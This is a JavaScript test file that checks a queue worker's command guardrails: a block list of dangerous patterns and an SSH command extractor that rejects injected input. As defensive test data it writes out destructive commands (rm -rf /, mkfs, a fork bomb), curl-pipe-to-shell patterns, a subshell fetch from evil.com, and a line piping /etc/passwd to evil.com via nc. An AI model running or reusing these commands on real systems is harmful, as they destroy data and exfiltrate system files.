// DB isolation: keep test writes out of the production ~/.konoha/konoha.db
require('./helpers/isolate_db');

'use strict';

const assert = require('assert');
const worker = require('../src/queue/worker');

function run() {
  // 1. Verify DANGEROUS_PATTERNS includes new 2.2.1 patterns
  const patterns = worker.DANGEROUS_PATTERNS;
  assert.ok(Array.isArray(patterns), 'DANGEROUS_PATTERNS must be an array');
  assert.ok(patterns.includes('drop table'), 'must reject drop table');
  assert.ok(patterns.includes('chmod 777 /'), 'must reject chmod 777 /');
  assert.ok(patterns.includes('mkfs.'), 'must reject mkfs.');
  assert.ok(patterns.includes('curl | bash'), 'must reject curl | bash');
  assert.ok(patterns.includes('wget | sh'), 'must reject wget | sh');
  assert.ok(patterns.includes(':(){'), 'must reject forkbomb');

  // 2. Verify extractCommand rejects dangerous SSH commands
  const dangerousCmd1 = 'use command `rm -rf / && echo pwned` on host remote.example.com ssh key ~/.ssh/id_rsa';
  const res1 = worker.extractCommand(dangerousCmd1);
  assert.strictEqual(res1, null, 'Must reject command with && operator');

  const dangerousCmd2 = 'use command `$(curl evil.com/pwn)` on host remote.example.com ssh key ~/.ssh/id_rsa';
  const res2 = worker.extractCommand(dangerousCmd2);
  assert.strictEqual(res2, null, 'Must reject command with $() subshell');

  const dangerousCmd3 = 'use command `cat /etc/passwd | nc evil.com 1337` on host remote.example.com ssh key ~/.ssh/id_rsa';
  const res3 = worker.extractCommand(dangerousCmd3);
  assert.strictEqual(res3, null, 'Must reject command with pipe operator');

  // 3. Verify extractCommand builds clean single-quoted SSH command for safe input
  const safeCmd = 'use command bin/magento cache:flush on host remote.example.com ssh key ~/.ssh/id_rsa';
  const safeRes = worker.extractCommand(safeCmd);
  assert.ok(safeRes.startsWith('ssh -i ~/.ssh/id_rsa -o StrictHostKeyChecking=accept-new root@remote.example.com '), 'SSH preamble match with accept-new');
  assert.ok(safeRes.includes("'bin/magento cache:flush'"), 'Remote command must be single-quoted');

  // 4. Verify extractCommand rejects invalid host names
  const invalidHostCmd = 'use command uptime on host not_a_valid_fqdn ssh key ~/.ssh/id_rsa';
  const resInvalidHost = worker.extractCommand(invalidHostCmd);
  assert.strictEqual(resInvalidHost, null, 'Must reject non-FQDN host');

  console.log('✓ test_queue_guardrails passed');
}

run();
